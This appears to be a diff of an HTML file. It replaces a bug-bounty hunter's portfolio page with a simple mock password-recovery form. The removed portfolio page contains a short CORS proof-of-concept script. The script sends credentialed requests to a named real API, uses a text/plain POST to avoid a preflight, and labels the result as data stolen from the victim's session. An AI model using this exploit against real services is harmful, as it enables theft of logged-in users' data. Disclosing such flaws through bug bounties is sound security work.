@@ -1,1772 +1,236 @@
 <!DOCTYPE html>
-
-
-
-<html>
-
-
-<head><title>CORS PoC - band.link</title></head>
-
-
 <html lang="en">
-
-
 <head>
-
-
-  <meta charset="UTF-8"/>
-
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-
-
-  <title>Omar Ahmed — Security Researcher</title>
-
-
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Fira+Code:wght@300;400;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"/>
-
-
-  <style>
-
-
-    :root {
-
-
-      --red:       #e8001d;
-
-
-      --red2:      #ff1a35;
-
-
-      --red-glow:  rgba(232,0,29,0.4);
-
-
-      --red-faint: rgba(232,0,29,0.06);
-
-
-      --red-mid:   rgba(232,0,29,0.18);
-
-
-      --black:     #000;
-
-
-      --bg:        #050507;
-
-
-      --bg2:       #0a0a0e;
-
-
-      --bg3:       #0f0f15;
-
-
-      --border:    rgba(255,255,255,0.06);
-
-
-      --border-r:  rgba(232,0,29,0.3);
-
-
-      --text:      #f0f0f5;
-
-
-      --text2:     #9090a8;
-
-
-      --text3:     #555570;
-
-
-      --green:     #00e676;
-
-
-      --accent2:   #7b61ff;
-
-
-    }
-
-
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-
-    html { scroll-behavior: smooth; }
-
-
-    body {
-
-
-      background: var(--bg);
-
-
-      color: var(--text);
-
-
-      font-family: 'Inter', sans-serif;
-
-
-      overflow-x: hidden;
-
-
-      cursor: none;
-
-
-    }
-
-
-
-
-
-    /* Cursor */
-
-
-    #cursor {
-
-
-      position: fixed; width: 12px; height: 12px;
-
-
-      background: var(--red); border-radius: 50%;
-
-
-      pointer-events: none; z-index: 99999;
-
-
-      transform: translate(-50%,-50%);
-
-
-      box-shadow: 0 0 12px var(--red-glow);
-
-
-      transition: width .2s, height .2s;
-
-
-    }
-
-
-    #cursor-ring {
-
-
-      position: fixed; width: 36px; height: 36px;
-
-
-      border: 1px solid rgba(232,0,29,0.5); border-radius: 50%;
-
-
-      pointer-events: none; z-index: 99998;
-
-
-      transform: translate(-50%,-50%);
-
-
-      transition: width .2s, height .2s, border-color .2s;
-
-
-    }
-
-
-
-
-
-    /* Scanlines */
-
-
-    #scanlines {
-
-
-      position: fixed; inset: 0;
-
-
-      background: repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.07) 3px,rgba(0,0,0,.07) 4px);
-
-
-      pointer-events: none; z-index: 9997;
-
-
-    }
-
-
-
-
-
-    /* NAV */
-
-
-    nav {
-
-
-      position: fixed; top:0; left:0; right:0; z-index:1000;
-
-
-      display:flex; align-items:center; justify-content:space-between;
-
-
-      padding:0 3rem; height:64px;
-
-
-      background: rgba(5,5,7,.88);
-
-
-      backdrop-filter: blur(20px);
-
-
-      border-bottom: 1px solid var(--border);
-
-
-    }
-
-
-    .nav-logo {
-
-
-      font-family:'Orbitron',sans-serif; font-weight:700; font-size:.9rem;
-
-
-      color:var(--red); letter-spacing:.1em;
-
-
-      text-shadow: 0 0 16px var(--red-glow);
-
-
-    }
-
-
-    .nav-links { display:flex; gap:2.5rem; }
-
-
-    .nav-links a {
-
-
-      font-family:'Fira Code',monospace; font-size:.72rem;
-
-
-      color:var(--text2); text-decoration:none; letter-spacing:.18em;
-
-
-      text-transform:uppercase; position:relative; transition:color .2s;
-
-
-    }
-
-
-    .nav-links a::after {
-
-
-      content:''; position:absolute; left:0; bottom:-4px;
-
-
-      width:0; height:1px; background:var(--red); transition:width .3s;
-
-
-    }
-
-
-    .nav-links a:hover { color:var(--text); }
-
-
-    .nav-links a:hover::after { width:100%; }
-
-
-
-
-
-    /* HERO */
-
-
-    #hero {
-
-
-      position:relative; min-height:100vh;
-
-
-      display:flex; align-items:center; justify-content:center;
-
-
-      text-align:center; overflow:hidden;
-
-
-    }
-
-
-    #particle-canvas { position:absolute; inset:0; width:100%; height:100%; }
-
-
-    .hero-inner { position:relative; z-index:2; padding:2rem; }
-
-
-
-
-
-    .hero-eyebrow {
-
-
-      font-family:'Fira Code',monospace; font-size:.7rem;
-
-
-      color:var(--green); letter-spacing:.4em; text-transform:uppercase;
-
-
-      margin-bottom:1.8rem;
-
-
-      display:inline-flex; align-items:center; gap:.7rem;
-
-
-    }
-
-
-    .hero-eyebrow::before {
-
-
-      content:''; width:8px; height:8px; border-radius:50%;
-
-
-      background:var(--green); box-shadow:0 0 10px var(--green);
-
-
-      animation:pulse 2s ease infinite; flex-shrink:0;
-
-
-    }
-
-
-    @keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.7);opacity:.5}}
-
-
-
-
-
-    .hero-name {
-
-
-      font-family:'Orbitron',sans-serif; font-weight:900;
-
-
-      font-size:clamp(3.2rem,10vw,7.5rem); line-height:.9;
-
-
-      letter-spacing:.02em;
-
-
-    }
-
-
-    .hero-name .line1 { color:var(--text); position:relative; display:inline-block; }
-
-
-    .hero-name .line2 { color:var(--red); display:block;
-
-
-      text-shadow:0 0 30px var(--red-glow),0 0 80px rgba(232,0,29,.15); }
-
-
-
-
-
-    /* glitch on line1 */
-
-
-    .hero-name .line1::before,
-
-
-    .hero-name .line1::after {
-
-
-      content:attr(data-text); position:absolute; inset:0;
-
-
-    }
-
-
-    .hero-name .line1::before {
-
-
-      color:rgba(0,230,118,.7);
-
-
-      animation:g1 6s infinite; clip-path:polygon(0 20%,100% 20%,100% 40%,0 40%);
-
-
-    }
-
-
-    .hero-name .line1::after {
-
-
-      color:rgba(123,97,255,.7);
-
-
-      animation:g2 6s infinite; clip-path:polygon(0 60%,100% 60%,100% 75%,0 75%);
-
-
-    }
-
-
-    @keyframes g1{0%,91%,100%{transform:translate(0);opacity:0}92%{transform:translate(-4px,1px);opacity:1}94%{transform:translate(4px);opacity:1}96%{opacity:0}}
-
-
-    @keyframes g2{0%,93%,100%{transform:translate(0);opacity:0}94%{transform:translate(3px,-2px);opacity:1}96%{opacity:0}}
-
-
-
-
-
-    .hero-tagline {
-
-
-      margin-top:1.4rem;
-
-
-      font-family:'Fira Code',monospace;
-
-
-      font-size:clamp(.85rem,2.2vw,1.1rem);
-
-
-      color:var(--text2); letter-spacing:.2em;
-
-
-    }
-
-
-    #typed-text { color:var(--red2); }
-
-
-    .tcursor {
-
-
-      display:inline-block; width:2px; height:1em;
-
-
-      background:var(--red); vertical-align:middle;
-
-
-      animation:bc .75s step-end infinite;
-
-
-    }
-
-
-    @keyframes bc{50%{opacity:0}}
-
-
-
-
-
-    .hero-quote {
-
-
-      display:inline-block; margin-top:2.2rem;
-
-
-      padding:.9rem 2rem;
-
-
-      border-left:2px solid var(--red);
-
-
-      background:rgba(232,0,29,.05);
-
-
-      backdrop-filter:blur(8px);
-
-
-      font-family:'Fira Code',monospace;
-
-
-      font-size:.9rem; font-style:italic; color:var(--text);
-
-
-    }
-
-
-    .hero-quote .q { color:var(--red); }
-
-
-
-
-
-    .hero-btn {
-
-
-      display:inline-flex; align-items:center; gap:.5rem;
-
-
-      margin-top:2.5rem; padding:.9rem 2.2rem;
-
-
-      border:1px solid var(--red); background:transparent;
-
-
-      color:var(--red); font-family:'Fira Code',monospace;
-
-
-      font-size:.78rem; letter-spacing:.15em; text-transform:uppercase;
-
-
-      text-decoration:none; position:relative; overflow:hidden;
-
-
-      transition:color .3s;
-
-
-    }
-
-
-    .hero-btn::before {
-
-
-      content:''; position:absolute; inset:0;
-
-
-      background:var(--red); transform:translateX(-101%); transition:transform .35s ease;
-
-
-    }
-
-
-    .hero-btn span { position:relative; z-index:1; }
-
-
-    .hero-btn:hover { color:var(--black); }
-
-
-    .hero-btn:hover::before { transform:translateX(0); }
-
-
-
-
-
-    .scroll-hint {
-
-
-      position:absolute; bottom:2rem; left:50%; transform:translateX(-50%);
-
-
-      font-family:'Fira Code',monospace; font-size:.6rem;
-
-
-      color:var(--text3); letter-spacing:.35em; text-transform:uppercase;
-
-
-      display:flex; flex-direction:column; align-items:center; gap:.4rem;
-
-
-      animation:bob 2.5s ease-in-out infinite;
-
-
-    }
-
-
-    .scroll-hint svg { color:var(--red); opacity:.5; }
-
-
-    @keyframes bob{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(10px)}}
-
-
-
-
-
-    /* SECTION SHELL */
-
-
-    .sw { padding:6rem 2rem; max-width:1000px; margin:0 auto; }
-
-
-    .sh { margin-bottom:3rem; }
-
-
-    .stag { font-family:'Fira Code',monospace; font-size:.66rem; color:var(--red); letter-spacing:.5em; text-transform:uppercase; margin-bottom:.5rem; }
-
-
-    .sh2 {
-
-
-      font-family:'Orbitron',sans-serif; font-size:clamp(1.5rem,4vw,2.1rem); font-weight:700; color:var(--text);
-
-
-      position:relative; display:inline-block;
-
-
-    }
-
-
-    .sh2::after { content:''; position:absolute; left:0; bottom:-10px; width:48px; height:2px; background:var(--red); box-shadow:0 0 10px var(--red-glow); }
-
-
-
-
-
-    .divider { height:1px; max-width:1000px; margin:0 auto; background:linear-gradient(90deg,transparent,var(--border-r),transparent); }
-
-
-
-
-
-    /* REVEAL */
-
-
-    .reveal { opacity:0; transform:translateY(36px); transition:opacity .75s ease,transform .75s ease; }
-
-
-    .reveal.in { opacity:1; transform:translateY(0); }
-
-
-    .d1{transition-delay:.1s} .d2{transition-delay:.2s} .d3{transition-delay:.3s}
-
-
-    .d4{transition-delay:.4s} .d5{transition-delay:.5s}
-
-
-
-
-
-    /* ABOUT CARDS */
-
-
-    .about-grid { display:grid; grid-template-columns:1fr 1fr; gap:1.1rem; }
-
-
-    @media(max-width:600px){.about-grid{grid-template-columns:1fr}}
-
-
-    .acard {
-
-
-      display:flex; align-items:flex-start; gap:1rem;
-
-
-      padding:1.25rem 1.4rem;
-
-
-      background:var(--bg2); border:1px solid var(--border);
-
-
-      border-left:2px solid var(--red);
-
-
-      position:relative; overflow:hidden;
-
-
-      transition:transform .25s,box-shadow .25s,border-color .25s;
-
-
-    }
-
-
-    .acard::after {
-
-
-      content:''; position:absolute; inset:0;
-
-
-      background:linear-gradient(120deg,var(--red-faint),transparent 55%);
-
-
-      opacity:0; transition:opacity .3s;
-
-
-    }
-
-
-    .acard:hover { transform:translateY(-4px); border-color:var(--red); box-shadow:0 12px 35px rgba(0,0,0,.5),0 0 0 1px var(--red-mid); }
-
-
-    .acard:hover::after { opacity:1; }
-
-
-    .aicon { font-size:1.35rem; flex-shrink:0; position:relative; z-index:1; }
-
-
-    .abody { position:relative; z-index:1; }
-
-
-    .albl { font-family:'Fira Code',monospace; font-size:.62rem; color:var(--red); letter-spacing:.3em; text-transform:uppercase; margin-bottom:.3rem; }
-
-
-    .aval { font-size:.88rem; color:var(--text); line-height:1.55; }
-
-
-    .acard.full { grid-column:1/-1; }
-
-
-
-
-
-    /* TERMINAL */
-
-
-    .term {
-
-
-      background:var(--bg2); border:1px solid var(--border);
-
-
-      border-radius:4px; overflow:hidden;
-
-
-      box-shadow:0 24px 60px rgba(0,0,0,.65);
-
-
-    }
-
-
-    .term-bar {
-
-
-      display:flex; align-items:center; gap:.5rem;
-
-
-      padding:.8rem 1.2rem; background:#0d0d12;
-
-
-      border-bottom:1px solid var(--border);
-
-
-    }
-
-
-    .td { width:12px; height:12px; border-radius:50%; }
-
-
-    .td.r{background:#ff5f57} .td.y{background:#febc2e} .td.g{background:#28c840}
-
-
-    .ttl { flex:1; text-align:center; font-family:'Fira Code',monospace; font-size:.68rem; color:var(--text3); }
-
-
-    .term-body { padding:1.6rem 2rem; font-family:'Fira Code',monospace; font-size:.82rem; line-height:1.95; }
-
-
-    .tp  { color:var(--red); }
-
-
-    .tc  { color:#a8c4ff; }
-
-
-    .tk  { color:var(--text2); }
-
-
-    .tv  { color:var(--green); }
-
-
-    .tcm { color:#363648; }
-
-
-    .ti  { padding-left:2ch; }
-
-
-    .tl  { display:flex; gap:1ch; flex-wrap:wrap; }
-
-
-    .tcur{ display:inline-block; width:9px; height:.85em; background:var(--red); vertical-align:middle; animation:bc .8s step-end infinite; }
-
-
-
-
-
-    /* SKILLS */
-
-
-    .skills-grid { display:grid; grid-template-columns:1fr 1fr; gap:3.5rem; }
-
-
-    @media(max-width:600px){.skills-grid{grid-template-columns:1fr}}
-
-
-    .sg h3 { font-family:'Fira Code',monospace; font-size:.68rem; color:var(--red); letter-spacing:.35em; text-transform:uppercase; margin-bottom:1.6rem; }
-
-
-    .si { margin-bottom:1.3rem; }
-
-
-    .sm { display:flex; justify-content:space-between; margin-bottom:.45rem; }
-
-
-    .sn { font-family:'Fira Code',monospace; font-size:.8rem; color:var(--text); }
-
-
-    .sp { font-family:'Orbitron',sans-serif; font-size:.62rem; color:var(--red); }
-
-
-    .sbg { height:3px; background:var(--bg3); border-radius:2px; overflow:hidden; }
-
-
-    .sbf { height:100%; width:0%; background:linear-gradient(90deg,var(--red),var(--red2)); border-radius:2px; box-shadow:0 0 8px var(--red-glow); transition:width 1.3s cubic-bezier(.2,.8,.2,1); }
-
-
-    .tool-tags { display:flex; flex-wrap:wrap; gap:.65rem; }
-
-
-    .ttag {
-
-
-      padding:.38rem .95rem; border:1px solid var(--border);
-
-
-      background:var(--bg2); font-family:'Fira Code',monospace;
-
-
-      font-size:.74rem; color:var(--text2);
-
-
-      position:relative; overflow:hidden;
-
-
-      transition:all .22s;
-
-
-    }
-
-
-    .ttag::before { content:''; position:absolute; left:0; top:0; bottom:0; width:2px; background:var(--red); transform:scaleY(0); transition:transform .22s; }
-
-
-    .ttag:hover { border-color:var(--red); color:var(--text); background:var(--red-faint); transform:translateY(-2px); box-shadow:0 4px 16px rgba(232,0,29,.15); }
-
-
-    .ttag:hover::before { transform:scaleY(1); }
-
-
-
-
-
-    /* CERTS */
-
-
-    .certs-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:1.5rem; }
-
-
-    .ccard {
-
-
-      padding:2rem 1.6rem; background:var(--bg2);
-
-
-      border:1px solid var(--border);
-
-
-      position:relative; overflow:hidden;
-
-
-      transition:transform .3s,box-shadow .3s;
-
-
-    }
-
-
-    .ccard::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg,var(--red),transparent); box-shadow:0 0 14px var(--red); }
-
-
-    .ccard::after { content:attr(data-c); position:absolute; right:-8px; bottom:-12px; font-family:'Orbitron',sans-serif; font-size:3.8rem; font-weight:900; color:rgba(232,0,29,.04); pointer-events:none; }
-
-
-    .ccard:hover { transform:translateY(-6px); box-shadow:0 20px 45px rgba(0,0,0,.6),0 0 0 1px var(--border-r); }
-
-
-    .cicon { font-size:2rem; margin-bottom:1rem; }
-
-
-    .cname { font-family:'Orbitron',sans-serif; font-size:1.1rem; font-weight:700; color:var(--red); margin-bottom:.3rem; text-shadow:0 0 20px var(--red-glow); }
-
-
-    .cfull { font-family:'Fira Code',monospace; font-size:.7rem; color:var(--text2); line-height:1.5; }
-
-
-
-
-
-    /* FOOTER */
-
-
-    footer { border-top:1px solid var(--border); padding:3rem 2rem; text-align:center; }
-
-
-    .flogo { font-family:'Orbitron',sans-serif; font-size:1rem; font-weight:900; color:var(--red); margin-bottom:.5rem; text-shadow:0 0 20px var(--red-glow); }
-
-
-    .fsub  { font-family:'Fira Code',monospace; font-size:.68rem; color:var(--text3); letter-spacing:.3em; }
-
-
-
-
-
-    ::-webkit-scrollbar { width:4px; }
-
-
-    ::-webkit-scrollbar-track { background:var(--black); }
-
-
-    ::-webkit-scrollbar-thumb { background:var(--red); border-radius:2px; }
-
-
-  </style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Password Recovery</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Inter,Segoe UI,Arial,sans-serif;
+}
+
+body{
+    background:#f5f6f8;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+}
+
+header{
+    height:70px;
+    background:#ffffff;
+    border-bottom:1px solid #e5e5e5;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 40px;
+}
+
+.logo{
+    font-size:28px;
+    font-weight:700;
+    color:#ff5a00;
+}
+
+nav a{
+    text-decoration:none;
+    color:#444;
+    margin-left:25px;
+    transition:.2s;
+}
+
+nav a:hover{
+    color:#ff5a00;
+}
+
+.wrapper{
+    flex:1;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:40px;
+}
+
+.card{
+    width:430px;
+    background:#fff;
+    border-radius:14px;
+    padding:40px;
+    box-shadow:0 12px 30px rgba(0,0,0,.08);
+}
+
+.card h1{
+    font-size:28px;
+    margin-bottom:10px;
+}
+
+.card p{
+    color:#666;
+    margin-bottom:25px;
+    line-height:1.6;
+}
+
+label{
+    font-size:14px;
+    font-weight:600;
+    color:#444;
+}
+
+input{
+    width:100%;
+    margin-top:8px;
+    margin-bottom:20px;
+    padding:14px;
+    border:1px solid #d6d6d6;
+    border-radius:8px;
+    font-size:15px;
+    transition:.2s;
+}
+
+input:focus{
+    outline:none;
+    border-color:#ff5a00;
+    box-shadow:0 0 0 3px rgba(255,90,0,.15);
+}
+
+button{
+    width:100%;
+    border:none;
+    background:#ff5a00;
+    color:white;
+    padding:15px;
+    border-radius:8px;
+    font-size:16px;
+    cursor:pointer;
+    transition:.25s;
+}
+
+button:hover{
+    background:#e24f00;
+}
+
+button:disabled{
+    opacity:.7;
+    cursor:wait;
+}
+
+.message{
+    display:none;
+    margin-top:20px;
+    padding:14px;
+    border-radius:8px;
+    background:#ecfff0;
+    color:#1d7d36;
+    border:1px solid #b8e3c1;
+}
+
+footer{
+    text-align:center;
+    padding:20px;
+    color:#888;
+    font-size:14px;
+}
+
+@media(max-width:600px){
+
+header{
+padding:20px;
+}
+
+.card{
+width:100%;
+padding:30px;
+}
+
+}
+</style>
 
 </head>
-
 <body>
 
-
-  <h2>CORS PoC - Stealing Authenticated User Data from api.band.link</h2>
-
-
-  <pre id="output">Sending request...</pre>
-
-
-
-
-
-  <script>
-
-
-    // First try a GET request to a simpler endpoint
-
-
-    fetch("https://api.band.link/bandlink/list", {
-
-
-      method: "GET",
-
-
-      credentials: "include"
-
-
-    })
-
-
-    .then(response => {
-
-
-      if (!response.ok) throw new Error("HTTP " + response.status);
-
-
-      return response.json();
-
-
-    })
-
-
-    .then(data => {
-
-
-      document.getElementById("output").textContent =
-
-
-        "✅ Data stolen from victim session:\n\n" +
-
-
-        JSON.stringify(data, null, 2);
-
-
-    })
-
-
-    .catch(err => {
-
-
-      document.getElementById("output").textContent = "Error: " + err;
-
-
-      
-
-
-      // Fallback: try POST with text/plain to avoid preflight
-
-
-      fetch("https://api.band.link/bandlink/update", {
-
-
-        method: "POST",
-
-
-        credentials: "include",
-
-
-        headers: {
-
-
-          "Content-Type": "text/plain"
-
-
-        },
-
-
-        body: JSON.stringify({
-
-
-          "selected_domain": "band.link",
-
-
-          "hex": "N0Ed7",
-
-
-          "id": 4867715,
-
-
-          "type": "playlist"
-
-
-        })
-
-
-      })
-
-
-      .then(r => r.json())
-
-
-      .then(data => {
-
-
-        document.getElementById("output").textContent =
-
-
-          "✅ Data stolen:\n\n" + JSON.stringify(data, null, 2);
-
-
-      })
-
-
-      .catch(e => {
-
-
-        document.getElementById("output").textContent = "Both failed: " + e;
-
-
-      });
-
-
-    });
-
-
-  </script>
-
-
-
-
-
-<div id="cursor"></div>
-
-
-<div id="cursor-ring"></div>
-
-
-<div id="scanlines"></div>
-
-
-
-
-
-<!-- NAV -->
-
+<header>
+
+<div class="logo">
+MySite
+</div>
 
 <nav>
-
-
-  <div class="nav-logo">OA // SEC</div>
-
-
-  <div class="nav-links">
-
-
-    <a href="#about">About</a>
-
-
-    <a href="#terminal">Terminal</a>
-
-
-    <a href="#skills">Skills</a>
-
-
-    <a href="#certs">Certs</a>
-
-
-  </div>
-
-
+<a href="#">Home</a>
+<a href="#">Login</a>
+<a href="#">Register</a>
 </nav>
 
+</header>
 
+<div class="wrapper">
 
+<div class="card">
 
+<h1>Password Recovery</h1>
 
-<!-- HERO -->
+<p>
+Enter your email address below and we'll send you instructions to reset your password.
+</p>
 
+<form id="recoverForm">
 
-<section id="hero">
+<label>Email Address</label>
 
+<input
+type="email"
+id="email"
+placeholder="name@example.com"
+required>
 
-  <canvas id="particle-canvas"></canvas>
+<button id="submitBtn">
+Send Recovery Link
+</button>
 
+<div class="message" id="message">
+✅ Recovery email sent successfully.
+</div>
 
-  <div class="hero-inner">
-
-
-    <div class="hero-eyebrow">System Online &mdash; Identity Verified</div>
-
-
-    <h1 class="hero-name">
-
-
-      <span class="line1" data-text="OMAR">OMAR</span>
-
-
-      <span class="line2">AHMED</span>
-
-
-    </h1>
-
-
-    <p class="hero-tagline"><span id="typed-text"></span><span class="tcursor"></span></p>
-
-
-    <div class="hero-quote"><span class="q">›</span> "Where logic fails, I win."</div>
-
-
-    <br><br>
-
-
-    <a href="#about" class="hero-btn"><span>Explore Profile ↓</span></a>
-
-
-  </div>
-
-
-  <div class="scroll-hint">
-
-
-    <svg width="14" height="22" viewBox="0 0 14 22" fill="none" stroke="currentColor" stroke-width="1.2"><rect x=".6" y=".6" width="12.8" height="20.8" rx="6.4"/><line x1="7" y1="5" x2="7" y2="9"/></svg>
-
-
-    scroll
-
-
-  </div>
-
-
-</section>
-
-
-
-
-
-<div class="divider"></div>
-
-
-
-
-
-<!-- ABOUT -->
-
-
-<div class="sw" id="about">
-
-
-  <div class="sh reveal">
-
-
-    <div class="stag">// 01 &nbsp; Profile</div>
-
-
-    <h2 class="sh2">About Me</h2>
-
-
-  </div>
-
-
-  <div class="about-grid">
-
-
-    <div class="acard reveal d1">
-
-
-      <div class="aicon">🔍</div>
-
-
-      <div class="abody"><div class="albl">Role</div><div class="aval">Bug Bounty Hunter &amp; Penetration Tester</div></div>
-
-
-    </div>
-
-
-    <div class="acard reveal d2">
-
-
-      <div class="aicon">⚡</div>
-
-
-      <div class="abody"><div class="albl">Currently Working On</div><div class="aval">Web Application Security &amp; Exploit Research</div></div>
-
-
-    </div>
-
-
-    <div class="acard reveal d3">
-
-
-      <div class="aicon">📡</div>
-
-
-      <div class="abody"><div class="albl">Currently Learning</div><div class="aval">Advanced Web &amp; Mobile Exploitation, Web3 Testing</div></div>
-
-
-    </div>
-
-
-    <div class="acard reveal d4">
-
-
-      <div class="aicon">🤝</div>
-
-
-      <div class="abody"><div class="albl">Open to Collaborate</div><div class="aval">Open-Source Security Tools</div></div>
-
-
-    </div>
-
-
-    <div class="acard full reveal d5">
-
-
-      <div class="aicon">💬</div>
-
-
-      <div class="abody"><div class="albl">Ask Me About</div><div class="aval">Web Security · Penetration Testing · Linux · Exploit Development</div></div>
-
-
-    </div>
-
-
-  </div>
-
+</form>
 
 </div>
 
-
-
-
-
-<div class="divider"></div>
-
-
-
-
-
-<!-- TERMINAL -->
-
-
-<div class="sw" id="terminal">
-
-
-  <div class="sh reveal">
-
-
-    <div class="stag">// 02 &nbsp; Root Access</div>
-
-
-    <h2 class="sh2">whoami</h2>
-
-
-  </div>
-
-
-  <div class="term reveal d1">
-
-
-    <div class="term-bar">
-
-
-      <div class="td r"></div><div class="td y"></div><div class="td g"></div>
-
-
-      <div class="ttl">bash — omar@kali:~</div>
-
-
-    </div>
-
-
-    <div class="term-body">
-
-
-      <div class="tl"><span class="tp">omar@kali:~$</span><span class="tc">cat /etc/profile.d/omar.conf</span></div>
-
-
-      <br>
-
-
-      <div class="ti">
-
-
-        <div class="tl"><span class="tcm"># ── Identity ──────────────────────────────</span></div>
-
-
-        <div class="tl"><span class="tk">NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="tv">= "Omar Ahmed"</span></div>
-
-
-        <div class="tl"><span class="tk">HANDLE&nbsp;&nbsp;&nbsp;</span><span class="tv">= "omarahmedalx"</span></div>
-
-
-        <div class="tl"><span class="tk">ROLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="tv">= "Security Researcher | Bug Bounty Hunter"</span></div>
-
-
-        <br>
-
-
-        <div class="tl"><span class="tcm"># ── Focus Areas ───────────────────────────</span></div>
-
-
-        <div class="tl"><span class="tk">WORKING_ON</span><span class="tv">= "Web AppSec, Exploit Research"</span></div>
-
-
-        <div class="tl"><span class="tk">LEARNING&nbsp;&nbsp;</span><span class="tv">= "Mobile Exploitation, Web3 Testing"</span></div>
-
-
-        <div class="tl"><span class="tk">COLLAB&nbsp;&nbsp;&nbsp;</span><span class="tv">= "Open-source Security Tools"</span></div>
-
-
-        <br>
-
-
-        <div class="tl"><span class="tcm"># ── Certifications ────────────────────────</span></div>
-
-
-        <div class="tl"><span class="tk">CERT_1&nbsp;&nbsp;&nbsp;</span><span class="tv">= "eJPT"</span></div>
-
-
-        <div class="tl"><span class="tk">CERT_2&nbsp;&nbsp;&nbsp;</span><span class="tv">= "eWAPT v2"</span></div>
-
-
-        <div class="tl"><span class="tk">CERT_3&nbsp;&nbsp;&nbsp;</span><span class="tv">= "eWAPTx"</span></div>
-
-
-      </div>
-
-
-      <br>
-
-
-      <div class="tl"><span class="tp">omar@kali:~$</span><span class="tcur"></span></div>
-
-
-    </div>
-
-
-  </div>
-
-
 </div>
-
-
-
-
-
-<div class="divider"></div>
-
-
-
-
-
-<!-- SKILLS -->
-
-
-<div class="sw" id="skills">
-
-
-  <div class="sh reveal">
-
-
-    <div class="stag">// 03 &nbsp; Arsenal</div>
-
-
-    <h2 class="sh2">Skills &amp; Tools</h2>
-
-
-  </div>
-
-
-  <div class="skills-grid">
-
-
-    <div class="reveal d1">
-
-
-      <div class="sg">
-
-
-        <h3>// Languages</h3>
-
-
-        <div class="si"><div class="sm"><span class="sn">Python</span><span class="sp">85%</span></div><div class="sbg"><div class="sbf" data-w="85"></div></div></div>
-
-
-        <div class="si"><div class="sm"><span class="sn">Bash / Shell</span><span class="sp">80%</span></div><div class="sbg"><div class="sbf" data-w="80"></div></div></div>
-
-
-        <div class="si"><div class="sm"><span class="sn">JavaScript</span><span class="sp">70%</span></div><div class="sbg"><div class="sbf" data-w="70"></div></div></div>
-
-
-        <div class="si"><div class="sm"><span class="sn">C / C++</span><span class="sp">60%</span></div><div class="sbg"><div class="sbf" data-w="60"></div></div></div>
-
-
-        <div class="si"><div class="sm"><span class="sn">C#</span><span class="sp">55%</span></div><div class="sbg"><div class="sbf" data-w="55"></div></div></div>
-
-
-      </div>
-
-
-    </div>
-
-
-    <div class="reveal d2">
-
-
-      <div class="sg">
-
-
-        <h3>// Tools &amp; Platforms</h3>
-
-
-        <div class="tool-tags">
-
-
-          <div class="ttag">Burp Suite</div>
-
-
-          <div class="ttag">Nmap</div>
-
-
-          <div class="ttag">Metasploit</div>
-
-
-          <div class="ttag">Wireshark</div>
-
-
-          <div class="ttag">SQLMap</div>
-
-
-          <div class="ttag">Gobuster</div>
-
-
-          <div class="ttag">Nikto</div>
-
-
-          <div class="ttag">Linux</div>
-
-
-          <div class="ttag">Git</div>
-
-
-          <div class="ttag">Kali Linux</div>
-
-
-          <div class="ttag">OWASP</div>
-
-
-          <div class="ttag">Networking</div>
-
-
-        </div>
-
-
-      </div>
-
-
-    </div>
-
-
-  </div>
-
-
-</div>
-
-
-
-
-
-<div class="divider"></div>
-
-
-
-
-
-<!-- CERTS -->
-
-
-<div class="sw" id="certs">
-
-
-  <div class="sh reveal">
-
-
-    <div class="stag">// 04 &nbsp; Clearance</div>
-
-
-    <h2 class="sh2">Certifications</h2>
-
-
-  </div>
-
-
-  <div class="certs-grid">
-
-
-    <div class="ccard reveal d1" data-c="eJPT">
-
-
-      <div class="cicon">🛡️</div>
-
-
-      <div class="cname">eJPT</div>
-
-
-      <div class="cfull">eLearnSecurity Junior Penetration Tester</div>
-
-
-    </div>
-
-
-    <div class="ccard reveal d2" data-c="eWAPT">
-
-
-      <div class="cicon">🌐</div>
-
-
-      <div class="cname">eWAPT v2</div>
-
-
-      <div class="cfull">eLearnSecurity Web Application Penetration Tester</div>
-
-
-    </div>
-
-
-    <div class="ccard reveal d3" data-c="eWAPTx">
-
-
-      <div class="cicon">⚔️</div>
-
-
-      <div class="cname">eWAPTx</div>
-
-
-      <div class="cfull">eLearnSecurity Web Application Penetration Tester eXtreme</div>
-
-
-    </div>
-
-
-  </div>
-
-
-</div>
-
-
-
-
-
-<!-- FOOTER -->
-
 
 <footer>
-
-
-  <div class="flogo">OMAR AHMED</div>
-
-
-  <div class="fsub">Hunter of Bugs &nbsp;·&nbsp; Builder of Tools &nbsp;·&nbsp; omarahmedalx</div>
-
-
+© 2026 MySite. All rights reserved.
 </footer>
-
-
-
-
 
 <script>
 
+const form=document.getElementById("recoverForm");
+const btn=document.getElementById("submitBtn");
+const msg=document.getElementById("message");
 
-/* Cursor */
+form.addEventListener("submit",function(e){
 
+e.preventDefault();
 
-const cur=document.getElementById('cursor'), ring=document.getElementById('cursor-ring');
+btn.disabled=true;
+btn.innerHTML="Sending...";
 
+setTimeout(()=>{
 
-let mx=0,my=0,rx=0,ry=0;
+btn.disabled=false;
+btn.innerHTML="Send Recovery Link";
 
+msg.style.display="block";
 
-document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;});
+form.reset();
 
+},1500);
 
-(function loop(){
-
-
-  rx+=(mx-rx)*.15; ry+=(my-ry)*.15;
-
-
-  cur.style.cssText=`left:${mx}px;top:${my}px;`;
-
-
-  ring.style.cssText=`left:${rx}px;top:${ry}px;`;
-
-
-  requestAnimationFrame(loop);
-
-
-})();
-
-
-
-
-
-/* Particle canvas */
-
-
-(function(){
-
-
-  const c=document.getElementById('particle-canvas'),ctx=c.getContext('2d');
-
-
-  let W,H,pts=[];
-
-
